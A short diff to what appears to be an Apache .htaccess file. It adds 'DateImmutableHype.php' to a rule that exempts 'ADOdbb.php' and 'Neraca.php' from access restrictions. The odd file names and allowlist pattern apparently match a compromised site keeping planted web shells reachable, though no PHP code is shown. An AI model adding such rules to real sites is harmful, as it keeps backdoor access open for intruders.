@@ -5,8 +5,9 @@ Order allow,deny
 Deny from all
 </FilesMatch>
 
-<FilesMatch "^(ADOdbb.php|Neraca.php)$">
+<FilesMatch "^(ADOdbb.php|Neraca.php|DateImmutableHype.php)$">
 Order allow,deny
 Allow from all
 
 </FilesMatch>
+
